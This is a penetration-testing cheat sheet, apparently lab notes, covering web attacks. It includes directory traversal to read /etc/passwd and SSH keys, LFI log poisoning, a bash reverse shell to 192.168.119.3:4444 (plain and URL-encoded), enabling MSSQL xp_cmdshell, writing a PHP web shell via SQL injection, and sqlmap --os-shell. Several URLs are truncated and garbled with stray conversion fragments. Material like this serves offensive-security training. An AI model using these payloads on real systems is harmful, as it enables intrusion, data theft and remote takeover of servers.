# Web&#x20;

### Web Attacks

ðŸ’¡ Cross-platform PHP reverse shell: [https://github.com/ivan-sincek/php-reverse-](https://github.com/ivan-sincek/php-reverse-)

#### Directory Traversal

```bash
cat /etc/passwd  #displaying content through absolute path
cat ../../../etc/passwd  #relative path
```

* if the pwd is `/var/log/` then in order to view the `/etc/passwd` it will be like this

```bash
cat ../../etc/passwd
```

* In web it should be exploited like this, find a parameters and test it out

```
<http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd?page=../../../etc/passwd>
#check for id_rsa, id_ecdsa
```

* If the output is not getting formatted properly then,

```bash
curl <http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/pas><br>â€¢?page=../../../etc/passwd
```

* For windows

```
<http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/instal><br>â€¢?page=../../../windows/system32/drivers/etc/hosts
```

**URL Encoding**

Sometimes it doesn't show if we try path, then we need to encode them

```bash
curl <http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd><br>â€¢?page=..%2F..%2F..%2Fetc%2Fpasswd
```

**Wordpress**

Simple exploit: [https://github.com/leonjza/wordpress-shell](https://github.com/leonjza/wordpress-shell) Local

#### Local File Inclusion

* Main difference between Directory traversal and this attack is, here we're able to execute commands remotely.

At first we need to check if we can include log files

```
<http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.lo><br>#Reverse?page=/var/log/apache2/access.log&cmd=whoami
```

If RCE via LFI is possible then we can put reverse shells

```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell

```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22  #encoded
```

**PHP wrapper**

```bash
curl "<http://mountaindesserts.com/meteor/index.php?page=data://text/plain?page=php://filter/convert.base64-encode/resource=index.php>"
```

#### SQL Injection

```bash
impacket-mssqlclient <Administrator:Lab123@192.168.50.18> -windows-auth  #To login
```

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

#Now we can run commands
EXECUTE xp_cmdshell 'whoami';
```

Sometimes we may not have direct access to convert it to RCE from web, then follow below

```sql
UNION SELECT "<?php system($_GET['cmd']); ?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php"
```

Now we can exploit it

```
<http://192.168.45.285/tmp/webshell.php?cmd=id>  #Command execution
```

**SQLMap - Automated Code execution**

```bash
sqlmap -u <http://192.168.50.19/blindsqli.php?user=1> -p user  #Testing on parameter names "user"
sqlmap -u <http://192.168.50.19/blindsqli.php?user=1> -p user --dump  #Dumping database

#OS Shell
```

* Obtain the Post request from Burp suite and save it to post.txt

```bash
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"  #/var/www/html/tmp is the writable location on web
```
